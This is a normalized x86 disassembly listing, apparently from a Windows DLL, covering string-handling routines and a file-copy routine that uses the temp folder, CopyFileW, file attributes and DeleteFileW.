add esp 0xc
test ebx ebx
je r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
mov [ eax + ebx * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + ebx * 2 ] cx
mov eax esi
pop ebx
pop edi
pop esi
pop ebp
retn 0x8
cmp ecx 0x8
jb r-xdata
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
cmp eax edi
jbe r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push [ ebp + 0xc ]
sub edi eax
mov ecx esi
sar edi 0x1
push edi
push esi
call sub_10003a20
pop edi
pop esi
pop ebp
retn 0x8
sub_100097e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c932
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x20
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
call sub_1003c58d
mov edx [ ebp + 0xc ]
mov ecx eax
mov edx eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
mov [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2
test ecx ecx
je r-xdata
sub_10009890
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
cmp [ ecx + 0x10 ] edi
cmovb edi [ ecx + 0x10 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebp + 0x14 ]
cmp edi ebx
mov esi ebx
cmovb esi edi
test esi esi
je r-xdata
mov ecx [ ecx ]
xor eax eax
mov edx [ ebp + 0x10 ]
lea esp [ esp ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp edi ebx
jae r-xdata
movzx eax [ ecx ]
cmp ax [ edx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
xor eax eax
cmp edi ebx
setne al
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x10
test eax eax
jne r-xdata
mov ax [ ecx ]
cmp ax [ edx ]
jne r-xdata
sub_10009910
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c961
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100097e0
mov esi eax
mov [ ebp + 0xc ] esi
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
xor edx edx
mov [ eax ] dx
push [ ebp + 0x10 ]
call sub_10003980
sub_100099d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c991
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100097e0
mov esi eax
mov [ ebp + 0xc ] esi
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
xor edx edx
mov [ eax ] dx
push 0xffffffff
push edx
push [ ebp + 0x10 ]
call sub_10003a20
sub_10009aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c889
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
add ecx 0x4
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_10003a20
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10009b20
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ca7c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4d0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4c8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4e0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x1c ] esi
mov ebx [ ebp + 0x8 ]
lea ecx [ esp + 0x68 ]
push 0x0
push ebx
call sub_100080c0
mov [ esp + 0x4e8 ] 0x0
cmp [ esp + 0x70 ] 0x0
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esi - 0x28 ]
call sub_10009aa0
mov [ esp + 0x4e8 ] 0x2
cmp [ rw-data ] 0x0
mov edi [ InterlockedExchange@IAT ]
jne r-xdata
mov eax [ esi - 0x28 ]
lea ecx [ esi - 0x28 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x6c ]
sub esp 0x18
mov esi esp
mov [ esp + 0x2c ] esp
mov [ esp + 0x34 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x500 ] 0x1
push ebx
push [ esp + 0x38 ]
mov [ esp + 0x508 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov esi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x4
call sub_100383b0
push eax
push rw-data
call edi
mov [ esp + 0x4e8 ] 0xffffffff
mov [ esp + 0x68 ] r--data
mov [ esp + 0x4e8 ] 0x11
cmp [ esp + 0x84 ] 0x0
jbe r-xdata
mov edi [ rw-data ]
lea eax [ esp + 0xbc ]
push 0x412
push 0x0
push eax
call sub_10045ec0
add esp 0xc
cmp [ esi ] 0x0
jne r-xdata
mov ecx 0x5
call sub_100383b0
push eax
push rw-data
call edi
mov [ esp + 0x4e8 ] 0xffffffff
cmp [ esp + 0x88 ] 0x8
jb r-xdata
cmp [ esp + 0x88 ] 0x8
lea eax [ esp + 0x74 ]
cmovae eax [ esp + 0x74 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov ecx esi
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
xor eax eax
mov [ esp + 0x88 ] 0x7
mov [ esp + 0x74 ] ax
mov eax esi
mov [ esp + 0x84 ] 0x0
mov ecx [ esp + 0x4e0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x4c8 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x74 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push esi
push [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_10009890
test eax eax
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
lea eax [ esp + 0xbc ]
push eax
push 0x0
push 0x0
push 0x28
push 0x0
call [ SHGetFolderPathW@IAT ]
test eax eax
js r-xdata
mov ecx edi
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x40 ]
push eax
call sub_10003a20
mov [ esp + 0x500 ] 0xa
lea eax [ esp + 0x50 ]
push 0x0
push 0x1
push eax
mov [ esp + 0x50c ] 0x2
lea ecx [ esp + 0x8c ]
call sub_100090e0
mov [ esp + 0x4e8 ] 0xb
xor eax eax
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
mov [ esp + 0x4e8 ] 0xc
lea eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] 0x8
push [ esp + 0x48 ]
cmovae eax [ esp + 0x3c ]
push eax
push 0x0
push ecx
lea ecx [ esp + 0x60 ]
call sub_10009890
test eax eax
sete al
mov [ esp + 0x1b ] al
mov [ esp + 0x4e8 ] 0xb
cmp [ esp + 0x64 ] 0x8
jb r-xdata
cmp [ esp + 0xbc ] 0x0
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push edi
push [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_10009890
test eax eax
jne r-xdata
xor ecx ecx
mov [ esp + 0x64 ] 0x7
sub esp 0x18
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] cx
mov [ esp + 0x2c ] esp
test al al
je r-xdata
push [ esp + 0x50 ]
call j_sub_1003f3e3#2
mov al [ esp + 0x1f ]
add esp 0x4
lea ecx [ esp + 0xbc ]
lea edx [ ecx + 0x2 ]
nop
xor ecx ecx
lea eax [ esp + 0xbc ]
push ecx
push eax
lea ecx [ esp + 0x28 ]
call sub_10009730
jmp r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x40 ]
push eax
call sub_10003a20
mov [ esp + 0x500 ] 0x3
mov [ esp + 0x500 ] 0x2
call sub_10008500
add esp 0x18
test eax eax
je r-xdata
lea eax [ esp + 0xbc ]
push eax
push 0x208
call [ GetTempPathW@IAT ]
test eax eax
je r-xdata
mov ecx esp
xor eax eax
push 0xffffffff
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
lea eax [ esp + 0x58 ]
push eax
call sub_10003a20
mov [ esp + 0x500 ] 0xe
mov eax [ ebx ]
mov [ esp + 0x500 ] 0xb
mov ecx ebx
call [ eax + 0x18 ]
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0x4e8 ] 0xf
test esi esi
je r-xdata
mov ebx [ esp + 0x34 ]
mov eax esp
push eax
lea ecx [ ebx - 0x28 ]
call sub_10009aa0
mov [ esp + 0x500 ] 0xd
lea ecx [ ebx - 0x28 ]
mov eax [ ebx - 0x28 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov [ esp + 0x508 ] 0xb
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
lea eax [ esp + 0xbc ]
sar ecx 0x1
push ecx
push eax
lea ecx [ esp + 0x28 ]
call sub_10009730
jmp r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x40 ]
push eax
call sub_10003a20
mov [ esp + 0x500 ] 0x8
mov [ esp + 0x500 ] 0x2
lea ecx [ esp + 0xa4 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x4e8 ] 0x9
lea ecx [ esp + 0x20 ]
push eax
call sub_10003670
mov [ esp + 0x4e8 ] 0x2
lea ecx [ esp + 0x8c ]
call sub_100036b0
cmp [ esp + 0x34 ] 0x8
lea eax [ esp + 0x20 ]
mov ecx [ esp + 0x30 ]
cmovae eax [ esp + 0x20 ]
cmp [ eax + ecx * 2 - 0x2 ] 0x5c
jne r-xdata
lea eax [ esp + 0xbc ]
push eax
lea ecx [ esp + 0x24 ]
call sub_100093d0
jmp r-xdata
xor edi edi
mov ebx [ esp + 0x1c ]
mov ecx [ ebx - 0x28 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffd8
add ecx ebx
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov [ esp + 0x4e8 ] 0x2
cmp [ esp + 0x4c ] 0x8
jb r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x40 ]
push eax
call sub_10003a20
mov [ esp + 0x500 ] 0x5
mov eax [ ebx ]
mov [ esp + 0x500 ] 0x2
mov ecx ebx
call [ eax + 0x18 ]
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0x4e8 ] 0x6
test esi esi
je r-xdata
lea eax [ ecx - 0x1 ]
push eax
push 0x0
lea eax [ esp + 0xac ]
push eax
lea ecx [ esp + 0x2c ]
call sub_10009440
mov [ esp + 0x4e8 ] 0x4
lea ecx [ esp + 0x20 ]
push eax
call sub_10003670
mov [ esp + 0x4e8 ] 0x2
lea ecx [ esp + 0xa4 ]
call sub_100036b0
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov [ esp + 0x4e8 ] 0xb
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x58 ]
push eax
call sub_10003a20
mov [ esp + 0x500 ] 0x10
mov [ esp + 0x500 ] 0xb
mov ecx edi
call sub_100190c0
test edi edi
jne r-xdata
xor eax eax
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] ax
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
xor edi edi
mov ebx [ esp + 0x1c ]
mov ecx [ ebx - 0x28 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffd8
add ecx ebx
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
xor eax eax
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] ax
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
jmp r-xdata
xor esi esi
jmp r-xdata
mov [ esp + 0x4e8 ] 0x2
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x40 ]
push eax
call sub_10003a20
mov [ esp + 0x500 ] 0x7
mov [ esp + 0x500 ] 0x2
mov ecx edi
call sub_100190c0
test edi edi
jne r-xdata
mov [ esp + 0x4e8 ] 0x0
cmp [ esp + 0x34 ] 0x8
jb r-xdata
sub_1000a260
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c3b8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
add ecx 0x34
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000a2e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004cb63
mov eax [ fs : 0x0 ]
push eax
sub esp 0x778
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x770 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x788 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x98 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0x790 ] 0x0
cmp [ esp + 0xa0 ] 0x0
je r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x28 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esi - 0x44 ]
push eax
call sub_10003a20
mov [ esp + 0x7a8 ] 0x2
mov [ esp + 0x7a8 ] 0x0
lea ecx [ esp + 0x68 ]
call sub_10007be0
mov [ esp + 0x7a8 ] 0x3
mov ecx esp
mov [ esp + 0x28 ] esp
xor eax eax
push 0xffffffff
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
lea eax [ esi - 0x2c ]
push eax
call sub_10003a20
mov [ esp + 0x7a8 ] 0x4
mov [ esp + 0x7a8 ] 0x3
lea ecx [ esp + 0x98 ]
call sub_10007be0
mov [ esp + 0x7a8 ] 0x5
mov edi esp
cmp [ esp + 0x7c ] 0x8
lea edx [ esp + 0x68 ]
mov [ esp + 0x28 ] esp
cmovae edx [ esp + 0x68 ]
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
cmp [ edx ] ax
jne r-xdata
mov eax [ esi - 0x5c ]
lea ecx [ esi - 0x5c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x9c ]
sub esp 0x18
mov esi esp
mov [ esp + 0x28 ] esp
mov [ esp + 0x40 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x7a8 ] 0x1
push ebx
push [ esp + 0x44 ]
mov [ esp + 0x7b0 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov ecx edx
lea ebx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov [ esp + 0x790 ] 0xffffffff
mov [ esp + 0x98 ] r--data
mov [ esp + 0x790 ] 0xf
cmp [ esp + 0xb4 ] 0x0
jbe r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx ebx
sar ecx 0x1
push ecx
push edx
mov ecx edi
call sub_10009730
mov [ esp + 0x7a8 ] 0x6
lea eax [ esp + 0x44 ]
push eax
mov [ esp + 0x7ac ] 0x5
call sub_10007ff0
test eax eax
je r-xdata
mov [ esp + 0x790 ] 0xffffffff
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
cmp [ esp + 0xb8 ] 0x8
lea eax [ esp + 0xa4 ]
cmovae eax [ esp + 0xa4 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
push 0x2
lea ecx [ esi - 0x5c ]
call sub_10007da0
mov esi eax
cmp [ esp + 0x2c ] 0x0
je r-xdata
xor eax eax
mov [ esp + 0xb8 ] 0x7
mov [ esp + 0xa4 ] ax
mov eax esi
mov [ esp + 0xb4 ] 0x0
mov ecx [ esp + 0x788 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x770 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0xa4 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x94 ] 0x7
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] ax
mov [ esp + 0x790 ] al
cmp [ esp + 0x64 ] 0x8
jb r-xdata
push [ esp + 0x80 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] ax
mov [ esp + 0x790 ] 0x7
cmp [ esp + 0x30 ] eax
je r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
push [ esp + 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ esp + 0x34 ] 0x0
je r-xdata
inc [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
cmp [ esp + 0x94 ] 0x8
lea ecx [ esp + 0x80 ]
push edx
cmovae ecx [ esp + 0x84 ]
lea edx [ esp + 0x6c ]
cmp [ esp + 0x68 ] 0x8
lea eax [ esp + 0x54 ]
push edx
cmovae eax [ esp + 0x58 ]
push ecx
push eax
lea ecx [ esi - 0x5c ]
call sub_1000a9c0
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
mov edi [ InterlockedExchange@IAT ]
jne r-xdata
cmp [ esp + 0x94 ] 0x8
lea edx [ esp + 0x1c ]
push edx
lea edx [ esp + 0x6c ]
push edx
lea edx [ esp + 0x20 ]
push edx
lea edx [ esp + 0x2c ]
push edx
lea edx [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x94 ]
cmovae ecx [ esp + 0x94 ]
lea edx [ esp + 0x38 ]
cmp [ esp + 0x78 ] 0x8
lea eax [ esp + 0x64 ]
push edx
cmovae eax [ esp + 0x68 ]
push ecx
push eax
lea ecx [ esi - 0x5c ]
call sub_1000aad0
inc [ esp + 0x18 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x790 ] 0x8
push [ esp + 0x18 ]
push [ esp + 0x24 ]
push [ esp + 0x1c ]
push [ esp + 0x30 ]
push eax
lea eax [ esp + 0x100 ]
push eax
call sub_1000b080
add esp 0x18
cmp [ esp + 0xec ] 0x0
jne r-xdata
mov ecx 0x11
call sub_100382c0
push eax
push rw-data
call edi
lea ecx [ esp + 0xec ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xf0 ]
push eax
lea ecx [ esp + 0x40 ]
call sub_10005470
cmp [ esp + 0x78 ] 0x0
jbe r-xdata
push 0x94
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x10 ] edi
mov [ esp + 0x790 ] 0xd
test edi edi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor edi edi
mov ecx [ esi - 0x5c ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffa4
add ecx esi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx edi
call sub_10018c90
mov edi eax
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0x38 ]
push eax
call sub_10005430
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x28 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x88 ]
push eax
call sub_10003a20
mov [ esp + 0x7a8 ] 0x9
mov [ esp + 0x7a8 ] 0x8
lea ecx [ esp + 0xec ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x790 ] 0xa
lea ecx [ esp + 0x38 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x790 ] 0x8
lea ecx [ esp + 0xd4 ]
call sub_10001880
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x12
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov [ esp + 0x790 ] 0x8
sub esp 0x18
mov ecx esp
mov [ esp + 0x28 ] esp
lea eax [ esp + 0x50 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x7a8 ] 0xe
mov [ esp + 0x7a8 ] 0x8
mov ecx edi
call sub_1000a260
test edi edi
jne r-xdata
mov eax [ rw-data ]
push [ esp + 0x1c ]
push eax
lea eax [ esp + 0xf4 ]
push eax
call sub_1000b080
add esp 0xc
lea eax [ esp + 0xec ]
lea ecx [ esp + 0x38 ]
push eax
call sub_10005430
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
push 0x1
push [ esp + 0x38 ]
push eax
call sub_10007990
mov [ esp + 0x7a8 ] 0xb
mov [ esp + 0x7a8 ] 0x8
lea ecx [ esp + 0xd4 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x790 ] 0xc
lea ecx [ esp + 0x38 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x790 ] 0x8
lea ecx [ esp + 0xbc ]
call sub_10001880
mov ecx 0x13
call sub_100382c0
push eax
push rw-data
call edi
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x790 ] 0x5
cmp [ esp + 0x7c ] 0x8
jb r-xdata
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x790 ] 0x7
cmp [ esp + 0x4c ] 0x10
jb r-xdata
xor eax eax
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] ax
jmp r-xdata
push [ esp + 0x68 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x790 ] 0x3
cmp [ esp + 0x94 ] 0x8
jb r-xdata
sub_1000a9c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push 0x1
push edi
push esi
mov [ ebp - 0x4 ] ecx
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ GetLastError@IAT ]
call ebx
mov [ ebp + 0xc ] eax
cmp eax 0x50
jne r-xdata
mov edx [ ebp + 0x10 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x48 ] 0x2
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ esi ] 0x0
jne r-xdata
push edi
call [ GetFileAttributesW@IAT ]
test al 0x1
je r-xdata
mov ecx esi
lea edi [ ecx + 0x2 ]
nop
xor ecx ecx
jmp r-xdata
push edi
call [ DeleteFileW@IAT ]
test eax eax
je r-xdata
xor eax 0x1
push eax
push edi
call [ SetFileAttributesW@IAT ]
test eax eax
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
push esi
mov ecx edx
call sub_10009730
mov eax [ ebp + 0x14 ]
